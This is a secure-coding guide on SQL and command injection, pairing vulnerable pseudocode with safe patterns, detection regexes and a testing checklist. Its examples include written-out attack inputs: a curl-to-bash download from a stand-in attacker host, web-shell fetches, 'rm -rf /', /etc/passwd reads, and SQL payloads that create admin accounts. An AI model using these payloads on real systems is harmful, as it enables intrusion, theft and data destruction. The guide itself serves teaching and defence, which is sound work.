# Pattern 2: SQL Injection and Command Injection

## INSTRUCTIONS FOR AI/LLM

This document provides IN-DEPTH coverage of the most critical security anti-patterns.
Each section includes multiple examples, edge cases, and detailed explanations.
All code is PSEUDOCODE - implement using secure patterns in your target language.
Pay special attention to the "Common Mistakes" and "Edge Cases" subsections.
These patterns cause the majority of security vulnerabilities in AI-generated code.

**When generating code, you MUST:**
1. Never use string concatenation for SQL queries, shell commands, or HTML output
2. Never embed secrets, API keys, or credentials in source code
3. Always validate and sanitize all user input on the server side
4. Use parameterized queries, established authentication libraries, and context-aware encoding
5. Verify that any suggested packages actually exist before recommending them

---


---


**CWE References:** CWE-89 (SQL Injection), CWE-77 (Command Injection), CWE-78 (OS Command Injection)

**Priority Score:** 22/21 (SQL: Frequency 10, Severity 10, Detectability 4; Command: Frequency 8, Severity 10, Detectability 6)

---

## Introduction: Why This Remains Prevalent in AI-Generated Code

SQL injection and command injection are among the oldest known vulnerability classes, yet they continue to plague AI-generated code at alarming rates. Despite decades of secure coding education and well-established mitigation patterns, AI models persistently generate vulnerable code.

**Why AI Models Generate Injection Vulnerabilities:**

1. **Training Data Contamination:** Research shows that string-concatenated queries appear "thousands of times" in AI training data from GitHub repositories. The vulnerable pattern is statistically more common than the secure pattern in historical codebases.

2. **Simplicity Bias:** String concatenation is syntactically simpler than parameterized queries. AI models optimize for generating "working code" and the concatenated approach requires fewer tokens and concepts.

3. **Missing Adversarial Awareness:** AI models don't inherently think about how user input might be malicious. When asked to "query users by ID," the model focuses on the functional requirement, not the security implications.

4. **Tutorial Code Prevalence:** Many tutorials and documentation examples show vulnerable patterns for brevity. AI learns that `f"SELECT * FROM users WHERE id = {id}"` is a valid pattern.

5. **Context Limitation:** The AI cannot see your full application architecture, threat model, or data flow. It doesn't know which inputs come from untrusted sources.

**Impact Statistics:**

- **SQL Injection (CWE-89):** Ranked #2 in CWE Top 25 Most Dangerous Software Weaknesses (2025)
- **Command Injection (CWE-78):** Ranked #9 in CWE Top 25 (2025)
- **20% SQL Injection failure rate** across AI-generated tasks (Veracode 2025)
- **8 directly concatenated queries** found in a single testing session (Invicti Security)
- **CVE-2025-53773:** A real command injection vulnerability in GitHub Copilot code

---

## SQL Injection: Multiple BAD Examples

### BAD Example 1: String Concatenation in SELECT

```pseudocode
// VULNERABLE: Direct string concatenation
function getUserById(userId):
    query = "SELECT * FROM users WHERE id = " + userId
    return database.execute(query)

// Even worse with f-string/template literal
function getUserByEmail(email):
    query = f"SELECT * FROM users WHERE email = '{email}'"
    return database.execute(query)

// Attack: email = "' OR '1'='1' --"
// Result: SELECT * FROM users WHERE email = '' OR '1'='1' --'
// Returns ALL users in the database
```

**Why This Is Dangerous:**
- Attacker controls the query structure, not just a value
- Can extract entire database contents
- Can bypass authentication with `' OR '1'='1` patterns
- Comments (`--`, `#`, `/**/`) can truncate remainder of query

---

### BAD Example 2: Dynamic Table/Column Names

```pseudocode
// VULNERABLE: User-controlled table name
function getDataFromTable(tableName, id):
    query = f"SELECT * FROM {tableName} WHERE id = {id}"
    return database.execute(query)

// Attack: tableName = "users; DROP TABLE users; --"
// Result: SELECT * FROM users; DROP TABLE users; -- WHERE id = 1

// VULNERABLE: User-controlled column names
function sortUsers(sortColumn, sortOrder):
    query = f"SELECT * FROM users ORDER BY {sortColumn} {sortOrder}"
    return database.execute(query)

// Attack: sortColumn = "(SELECT password FROM users WHERE is_admin=1)"
// Result: Data exfiltration through error messages or timing
```

**Why This Is Dangerous:**
- Parameterized queries cannot protect table/column names
- Enables schema manipulation attacks
- Can execute arbitrary SQL statements via stacking
- Attackers can extract data through subquery injection

---

### BAD Example 3: ORDER BY Injection

```pseudocode
// VULNERABLE: ORDER BY with user input
function getProductList(category, sortBy):
    query = f"SELECT * FROM products WHERE category = ? ORDER BY {sortBy}"
    return database.execute(query, [category])

// Attack: sortBy = "price, (CASE WHEN (SELECT password FROM users LIMIT 1)
//                  LIKE 'a%' THEN price ELSE name END)"
// Result: Boolean-based blind SQL injection

// Attack: sortBy = "IF(1=1, price, name)"
// Result: Confirms SQL injection is possible
```

**Why This Is Dangerous:**
- Developers often parameterize WHERE but forget ORDER BY
- Cannot use standard parameterization for ORDER BY
- Enables blind SQL injection through conditional ordering
- Error-based extraction through invalid column references

---

### BAD Example 4: LIKE Clause Injection

```pseudocode
// VULNERABLE: Unescaped LIKE pattern
function searchProducts(searchTerm):
    query = f"SELECT * FROM products WHERE name LIKE '%{searchTerm}%'"
    return database.execute(query)

// Attack: searchTerm = "%' UNION SELECT username, password, null FROM users --"
// Result: UNION-based data extraction

// Even "safer" version has issues:
function searchProductsSafe(searchTerm):
    query = "SELECT * FROM products WHERE name LIKE ?"
    return database.execute(query, [f"%{searchTerm}%"])

// Attack: searchTerm = "%" (matches everything - DoS through performance)
// Attack: searchTerm = "_" repeated (wildcard matching - info disclosure)
```

**Why This Is Dangerous:**
- LIKE patterns need double escaping (SQL + LIKE wildcards)
- `%` and `_` are valid in parameterized queries but dangerous in LIKE
- Performance-based DoS through expensive wildcard patterns
- Can probe for data existence through LIKE behavior

---

### BAD Example 5: Batch/Stacked Query Injection

```pseudocode
// VULNERABLE: Query that allows stacking
function updateUserEmail(userId, newEmail):
    query = f"UPDATE users SET email = '{newEmail}' WHERE id = {userId}"
    database.execute(query, multiStatement = true)

// Attack: newEmail = "x'; INSERT INTO users (email, role) VALUES ('attacker@evil.com', 'admin'); --"
// Result: Creates new admin account

// Attack: newEmail = "x'; UPDATE users SET password = 'hacked' WHERE role = 'admin'; --"
// Result: Mass password reset for all admins
```

**Why This Is Dangerous:**
- Some database drivers allow multiple statements by default
- Single injection point enables unlimited query execution
- Can create backdoor accounts, modify permissions, exfiltrate data
- Often missed because original query "succeeds"

---

## Command Injection: Multiple BAD Examples

### BAD Example 1: Shell Command Construction

```pseudocode
// VULNERABLE: Direct command construction
function pingHost(hostname):
    command = "ping -c 4 " + hostname
    return shell.execute(command)

// Attack: hostname = "127.0.0.1; cat /etc/passwd"
// Result: ping -c 4 127.0.0.1; cat /etc/passwd
// Executes both commands

// VULNERABLE: Using shell=True with format strings
function checkDiskUsage(directory):
    command = f"du -sh {directory}"
    return subprocess.run(command, shell=True)

// Attack: directory = "/tmp; rm -rf /"
// Result: Destructive command execution
```

**Why This Is Dangerous:**
- Shell metacharacters (`;`, `|`, `&`, `$()`, backticks) enable command chaining
- Attacker gains shell access on the server
- Can read sensitive files, install malware, pivot to other systems
- Shell=True interprets all special characters

---

### BAD Example 2: Path Manipulation in Commands

```pseudocode
// VULNERABLE: File path from user input
function convertImage(inputFile, outputFile):
    command = f"convert {inputFile} -resize 800x600 {outputFile}"
    return shell.execute(command)

// Attack: inputFile = "image.jpg; curl attacker.com/shell.sh | bash"
// Result: Downloads and executes malware

// Attack: inputFile = "$(cat /etc/passwd > /tmp/out.txt)image.jpg"
// Result: File exfiltration via command substitution

// VULNERABLE: Filename in archiving
function createBackup(filename):
    command = f"tar -czf backup.tar.gz {filename}"
    return shell.execute(command)

// Attack: filename = "--checkpoint=1 --checkpoint-action=exec=sh\ shell.sh"
// Result: tar option injection (GTFOBins-style attack)
```

**Why This Is Dangerous:**
- Paths often contain attacker-controlled portions (uploaded filenames)
- Command-line tools have dangerous flag behaviors (GTFOBins)
- Argument injection even without shell metacharacters
- `$(...)` and backticks execute subcommands

---

### BAD Example 3: Argument Injection

```pseudocode
// VULNERABLE: Arguments from user input
function fetchUrl(url):
    command = f"curl {url}"
    return shell.execute(command)

// Attack: url = "-o /var/www/html/shell.php http://evil.com/shell.php"
// Result: Writes file to webserver (web shell)

// Attack: url = "--config /etc/passwd"
// Result: Error message reveals file contents

// VULNERABLE: Git commands with user input
function cloneRepository(repoUrl):
    command = f"git clone {repoUrl}"
    return shell.execute(command)

// Attack: repoUrl = "--upload-pack='touch /tmp/pwned' git://evil.com/repo"
// Result: Arbitrary command execution via git options
```

**Why This Is Dangerous:**
- Programs interpret flags anywhere in argument list
- Can override intended behavior via injected flags
- `--` doesn't always prevent injection (depends on program)
- Many tools have "write file" or "execute" options

---

### BAD Example 4: Environment Variable Injection

```pseudocode
// VULNERABLE: User-controlled environment variable
function runWithCustomPath(command, customPath):
    environment = {"PATH": customPath}
    return subprocess.run(command, env=environment, shell=True)

// Attack: customPath = "/tmp/evil:$PATH"
// If /tmp/evil contains malicious 'ls' binary, it executes instead

// VULNERABLE: Library path manipulation
function loadPlugin(pluginPath):
    environment = {"LD_PRELOAD": pluginPath}
    return subprocess.run("target-app", env=environment)

// Attack: pluginPath = "/tmp/evil.so"
// Result: Malicious shared library loaded, code execution
```

**Why This Is Dangerous:**
- Environment variables affect program behavior in unexpected ways
- PATH hijacking allows executing attacker binaries
- LD_PRELOAD/DYLD_INSERT_LIBRARIES enable library injection
- Some programs read secrets from environment (unintended exposure)

---

## GOOD Examples: Proper Patterns

### GOOD Example 1: Parameterized Queries (All Major DB Patterns)

```pseudocode
// SECURE: Parameterized query - positional parameters
function getUserById(userId):
    query = "SELECT * FROM users WHERE id = ?"
    return database.execute(query, [userId])

// SECURE: Named parameters
function getUserByEmailAndStatus(email, status):
    query = "SELECT * FROM users WHERE email = :email AND status = :status"
    return database.execute(query, {email: email, status: status})

// SECURE: Multiple value insertion
function createUser(name, email, role):
    query = "INSERT INTO users (name, email, role) VALUES (?, ?, ?)"
    return database.execute(query, [name, email, role])

// SECURE: IN clause with dynamic count
function getUsersByIds(userIds):
    placeholders = ", ".join(["?" for _ in userIds])
    query = f"SELECT * FROM users WHERE id IN ({placeholders})"
    return database.execute(query, userIds)

// SECURE: Transaction with multiple parameterized queries
function transferFunds(fromId, toId, amount):
    database.beginTransaction()
    try:
        database.execute("UPDATE accounts SET balance = balance - ? WHERE id = ?", [amount, fromId])
        database.execute("UPDATE accounts SET balance = balance + ? WHERE id = ?", [amount, toId])
        database.commit()
    catch error:
        database.rollback()
        throw error
```

**Why This Is Secure:**
- Database driver separates query structure from data
- Parameters are never interpreted as SQL
- Works with all standard data types
- Prevents all SQL injection variants in value positions

---

### GOOD Example 2: ORM Safe Usage

```pseudocode
// SECURE: ORM with typed queries
function getUserById(userId):
    return User.findOne({where: {id: userId}})

// SECURE: ORM with relationships
function getUserWithOrders(userId):
    return User.findOne({
        where: {id: userId},
        include: [{model: Order, as: 'orders'}]
    })

// SECURE: ORM query builder
function searchProducts(filters):
    query = Product.query()

    if filters.category:
        query = query.where('category', '=', filters.category)
    if filters.minPrice:
        query = query.where('price', '>=', filters.minPrice)
    if filters.maxPrice:
        query = query.where('price', '<=', filters.maxPrice)

    return query.get()

// WARNING: ORM raw query - still needs parameterization!
function customQuery(userId):
    // STILL VULNERABLE if using string interpolation:
    // return database.raw(f"SELECT * FROM users WHERE id = {userId}")

    // SECURE: Use ORM's parameterization
    return database.raw("SELECT * FROM users WHERE id = ?", [userId])
```

**Why This Is Secure:**
- ORM handles parameterization automatically
- Type checking prevents some injection attempts
- Query builders construct safe queries programmatically
- Still requires care with raw queries

---

### GOOD Example 3: Safe Dynamic Table/Column Names (Allowlist)

```pseudocode
// SECURE: Allowlist for table names
ALLOWED_TABLES = {"users", "products", "orders", "categories"}

function getDataFromTable(tableName, id):
    if tableName not in ALLOWED_TABLES:
        throw ValidationError("Invalid table name")

    // Safe because tableName is from allowlist, not user input
    query = f"SELECT * FROM {tableName} WHERE id = ?"
    return database.execute(query, [id])

// SECURE: Allowlist for sort columns
SORT_COLUMNS = {
    "name": "name",
    "price": "price",
    "date": "created_at",
    "popularity": "view_count"
}

function getProducts(sortBy, sortOrder):
    column = SORT_COLUMNS.get(sortBy, "name")  // Default to 'name'
    direction = "DESC" if sortOrder == "desc" else "ASC"

    query = f"SELECT * FROM products ORDER BY {column} {direction}"
    return database.execute(query)

// SECURE: Quoted identifiers as additional defense
function getDataDynamic(tableName, columnName, value):
    if tableName not in ALLOWED_TABLES:
        throw ValidationError("Invalid table")
    if columnName not in ALLOWED_COLUMNS[tableName]:
        throw ValidationError("Invalid column")

    // Use database quoting function for identifiers
    quotedTable = database.quoteIdentifier(tableName)
    quotedColumn = database.quoteIdentifier(columnName)

    query = f"SELECT * FROM {quotedTable} WHERE {quotedColumn} = ?"
    return database.execute(query, [value])
```

**Why This Is Secure:**
- Allowlist ensures only known-safe values used
- User input maps to predefined safe values
- Identifier quoting provides defense-in-depth
- Validation happens before query construction

---

### GOOD Example 4: Safe Command Execution

```pseudocode
// SECURE: Argument array (no shell interpretation)
function pingHost(hostname):
    // Validate hostname format first
    if not isValidHostname(hostname):
        throw ValidationError("Invalid hostname format")

    // Use argument array - shell metacharacters are literal
    result = subprocess.run(
        ["ping", "-c", "4", hostname],
        shell = false,  // CRITICAL: no shell interpretation
        capture_output = true,
        timeout = 30
    )
    return result.stdout

// SECURE: Allowlist for command arguments
ALLOWED_FORMATS = {"png", "jpg", "gif", "webp"}

function convertImage(inputPath, outputPath, format):
    // Validate format from allowlist
    if format not in ALLOWED_FORMATS:
        throw ValidationError("Invalid format")

    // Validate paths are within allowed directory
    if not isPathWithinDirectory(inputPath, UPLOAD_DIR):
        throw ValidationError("Invalid input path")
    if not isPathWithinDirectory(outputPath, OUTPUT_DIR):
        throw ValidationError("Invalid output path")

    // Safe argument array
    result = subprocess.run(
        ["convert", inputPath, "-resize", "800x600", f"{outputPath}.{format}"],
        shell = false
    )
    return result

// SECURE: Using libraries instead of shell commands
function checkDiskUsage(directory):
    // Use language-native library instead of shell
    return filesystem.getDirectorySize(directory)

function readJsonFile(filepath):
    // Don't use: shell.execute(f"cat {filepath} | jq .")
    // Use language JSON library
    return json.parse(filesystem.readFile(filepath))
```

**Why This Is Secure:**
- Argument arrays pass arguments directly to program
- No shell interpretation of metacharacters
- Allowlists prevent unexpected values
- Path validation prevents directory traversal
- Native libraries avoid shell entirely

---

## Edge Cases Section

### Edge Case 1: Second-Order Injection (Stored Then Executed)

```pseudocode
// DANGEROUS: Data stored safely but used unsafely later

// Step 1: User creates profile (looks safe)
function createProfile(userId, displayName):
    // Parameterized - SAFE for initial storage
    query = "INSERT INTO profiles (user_id, display_name) VALUES (?, ?)"
    database.execute(query, [userId, displayName])
    // Attacker sets displayName = "admin'--"

// Step 2: Background job uses stored data UNSAFELY
function generateReportForUser(userId):
    // Get the stored display name
    profile = database.execute("SELECT display_name FROM profiles WHERE user_id = ?", [userId])
    displayName = profile.display_name
    // "admin'--" retrieved from database

    // VULNERABLE: Trusting data from database
    reportQuery = f"INSERT INTO reports (title) VALUES ('Report for {displayName}')"
    database.execute(reportQuery)
    // Result: INSERT INTO reports (title) VALUES ('Report for admin'--')

// SECURE: Parameterize ALL queries, even with "internal" data
function generateReportForUserSafe(userId):
    profile = database.execute("SELECT display_name FROM profiles WHERE user_id = ?", [userId])

    // Still parameterize even though data is from database
    reportQuery = "INSERT INTO reports (title) VALUES (?)"
    database.execute(reportQuery, [f"Report for {profile.display_name}"])
```

**Detection:** Audit all code paths where database data is used in subsequent queries.

---

### Edge Case 2: Injection in Stored Procedures

```pseudocode
// DANGEROUS: Dynamic SQL inside stored procedure

// Stored Procedure Definition (in database)
CREATE PROCEDURE searchUsers(searchTerm VARCHAR(100))
BEGIN
    // VULNERABLE: Dynamic SQL construction
    SET @query = CONCAT('SELECT * FROM users WHERE name LIKE ''%', searchTerm, '%''');
    PREPARE stmt FROM @query;
    EXECUTE stmt;
END

// Application code looks safe...
function searchUsers(term):
    return database.callProcedure("searchUsers", [term])
    // But injection still occurs inside the procedure!

// SECURE: Parameterized even in stored procedures
CREATE PROCEDURE searchUsersSafe(searchTerm VARCHAR(100))
BEGIN
    // Use parameterization within procedure
    SELECT * FROM users WHERE name LIKE CONCAT('%', searchTerm, '%');
    // Or use prepared statement properly
    SET @query = 'SELECT * FROM users WHERE name LIKE ?';
    SET @search = CONCAT('%', searchTerm, '%');
    PREPARE stmt FROM @query;
    EXECUTE stmt USING @search;
END
```

**Detection:** Review all stored procedures for dynamic SQL construction.

---

### Edge Case 3: Injection Through Encoding Bypass

```pseudocode
// DANGEROUS: Encoding-based bypass attempts

// Scenario 1: Double-encoding bypass
function searchWithFilter(term):
    // Application URL-decodes once
    decoded = urlDecode(term)  // %2527 -> %27

    // WAF sees %27, not single quote
    // Second decode happens: %27 -> '

    query = f"SELECT * FROM items WHERE name = '{decoded}'"
    // Injection succeeds

// Scenario 2: Unicode normalization bypass
function filterUsername(username):
    // Check for dangerous characters
    if "'" in username or "\"" in username:
        throw ValidationError("Invalid characters")

    // VULNERABLE: Unicode normalization happens AFTER validation
    normalized = unicodeNormalize(username)
    // 'ʼ' (U+02BC) might normalize to "'" (U+0027) in some systems

    query = f"SELECT * FROM users WHERE username = '{normalized}'"

// SECURE: Parameterization makes encoding irrelevant
function searchSafe(term):
    // Encoding doesn't matter - it's just data
    query = "SELECT * FROM items WHERE name = ?"
    return database.execute(query, [term])

// SECURE: Validate AFTER all normalization
function filterUsernameSafe(username):
    // Normalize first
    normalized = unicodeNormalize(username)

    // Then validate
    if not isValidUsernameChars(normalized):
        throw ValidationError("Invalid characters")

    // Then use (still with parameterization)
    query = "SELECT * FROM users WHERE username = ?"
    return database.execute(query, [normalized])
```

**Detection:** Test with various encoded payloads (`%27`, `%2527`, Unicode variants).

---

## Common Mistakes Section

### Mistake 1: Thinking Escaping Is Enough

```pseudocode
// DANGEROUS: Manual escaping is error-prone

function getUserByNameEscaped(name):
    // "Escaping" by replacing quotes
    escapedName = name.replace("'", "''")
    query = f"SELECT * FROM users WHERE name = '{escapedName}'"
    return database.execute(query)

// Problems with this approach:
// 1. Different databases have different escape rules
// 2. Multibyte character encoding bypasses (GBK, etc.)
// 3. Doesn't handle all injection vectors
// 4. Easy to forget in one place
// 5. Backslash escaping varies by database

// Attack (MySQL with NO_BACKSLASH_ESCAPES off):
// name = "\' OR 1=1 --"
// Result: \'' OR 1=1 -- (backslash escapes first quote)

// Attack (multibyte): name = 0xbf27
// In GBK: 0xbf5c27 -> valid multibyte char + literal quote

// ALWAYS USE PARAMETERIZATION - it's not about escaping
function getUserByNameSafe(name):
    query = "SELECT * FROM users WHERE name = ?"
    return database.execute(query, [name])
```

**Key Insight:** Parameterization doesn't "escape" - it sends query structure and data separately.

---

### Mistake 2: Trusting "Internal" Data Sources

```pseudocode
// DANGEROUS: Trusting data because it's "internal"

function processMessage(messageFromQueue):
    // "This is from our internal queue, so it's safe"
    userId = messageFromQueue.userId

    query = f"SELECT * FROM users WHERE id = {userId}"
    return database.execute(query)

// BUT: Where did that queue message originate?
// - User input that was serialized to queue
// - External API response stored in queue
// - Another service that has its own vulnerabilities

// DANGEROUS: Trusting data from other tables/services
function getOrderDetails(orderId):
    order = database.execute("SELECT * FROM orders WHERE id = ?", [orderId])

    // Order.notes was user-supplied
    query = f"SELECT * FROM notes WHERE content LIKE '%{order.notes}%'"
    // Still vulnerable to second-order injection

// SECURE: Parameterize ALL queries regardless of data source
function processMessageSafe(messageFromQueue):
    query = "SELECT * FROM users WHERE id = ?"
    return database.execute(query, [messageFromQueue.userId])
```

**Rule:** Never trust ANY data in query construction - always parameterize.

---

### Mistake 3: Partial Parameterization

```pseudocode
// DANGEROUS: Parameterizing some parts but not others

function searchUsers(name, sortColumn, limit):
    // Parameterized the value, but not ORDER BY or LIMIT
    query = f"SELECT * FROM users WHERE name = ? ORDER BY {sortColumn} LIMIT {limit}"
    return database.execute(query, [name])

// Attack: sortColumn = "1; DELETE FROM users; --"
// Attack: limit = "1 UNION SELECT password FROM admin_users"

// DANGEROUS: Parameterized WHERE but not table
function getDataFlexible(tableName, filterColumn, filterValue):
    query = f"SELECT * FROM {tableName} WHERE {filterColumn} = ?"
    return database.execute(query, [filterValue])
    // Table name and column still injectable

// SECURE: Validate/allowlist everything that can't be parameterized
function searchUsersSafe(name, sortColumn, limit):
    // Allowlist for sort column
    allowedSorts = {"name", "email", "created_at"}
    sortCol = sortColumn if sortColumn in allowedSorts else "name"

    // Validate limit is positive integer
    limitNum = min(max(int(limit), 1), 100)  // Clamp to 1-100

    query = f"SELECT * FROM users WHERE name = ? ORDER BY {sortCol} LIMIT {limitNum}"
    return database.execute(query, [name])
```

**Key Insight:** Every injectable position needs either parameterization or allowlist validation.

---

## Detection Hints and Testing Approaches

### Automated Detection Patterns

```pseudocode
// Regex patterns to find SQL injection vulnerabilities:

// 1. String concatenation with SQL keywords
regex: /(SELECT|INSERT|UPDATE|DELETE|FROM|WHERE|ORDER BY).*(\+|\.concat|\$\{|f['"])/i

// 2. Format strings with SQL
regex: /f["'].*\b(SELECT|INSERT|UPDATE|DELETE)\b.*\{.*\}/i

// 3. String interpolation in queries
regex: /execute\s*\(\s*["`'].*\$\{?[a-zA-Z_]/

// Command injection patterns:

// 4. Shell execution with concatenation
regex: /(system|exec|shell_exec|popen|subprocess\.run|os\.system)\s*\(.*(\+|\$\{|f['"])/

// 5. Shell=True with variables
regex: /shell\s*=\s*[Tt]rue.*\{|shell\s*=\s*[Tt]rue.*\+/
```

### Manual Testing Approaches

```pseudocode
// SQL Injection Test Payloads:

basicTests = [
    "' OR '1'='1",           // Basic auth bypass
    "'; DROP TABLE test; --", // Stacked queries
    "' UNION SELECT null--",  // Union-based
    "1 AND 1=1",             // Boolean-based
    "1' AND SLEEP(5)--",     // Time-based blind
]

// Command Injection Test Payloads:

commandTests = [
    "; whoami",              // Command chaining
    "| id",                  // Pipe injection
    "$(whoami)",             // Command substitution
    "`id`",                  // Backtick substitution
    "& ping -c 4 attacker.com", // Background execution
]

// Testing Methodology:
1. Identify all input points (forms, URLs, headers, JSON fields)
2. Trace input flow to database queries or shell commands
3. Inject test payloads at each point
4. Monitor for:
   - SQL errors in response
   - Time delays (for blind injection)
   - DNS/HTTP callbacks (for out-of-band)
   - Changed behavior indicating injection success
```

### Code Review Checklist

| Check | What to Look For |
|-------|------------------|
| **Query Construction** | Any string concatenation or interpolation with query strings |
| **Dynamic Identifiers** | Table names, column names, ORDER BY from user input |
| **Raw Queries in ORM** | `.raw()`, `.execute()`, or similar with string building |
| **Shell Execution** | Any use of `system()`, `exec()`, `shell=True` |
| **Command Building** | String concatenation before command execution |
| **Input Sources** | Follow data from request to query/command |

---

## Security Checklist

- [ ] All SQL queries use parameterized statements or prepared queries
- [ ] ORM raw queries also use parameterization
- [ ] Dynamic table/column names validated against strict allowlist
- [ ] ORDER BY and LIMIT clauses use validated/allowlisted values
- [ ] No shell=True in subprocess calls
- [ ] All command-line arguments passed as arrays, not strings
- [ ] User-controlled file paths validated and sanitized
- [ ] Environment variables not set from user input
- [ ] Second-order injection considered (data from DB still parameterized)
- [ ] Stored procedures reviewed for internal dynamic SQL
- [ ] Input validation applied before any normalization/decoding
- [ ] Code review specifically checks all query/command construction

---
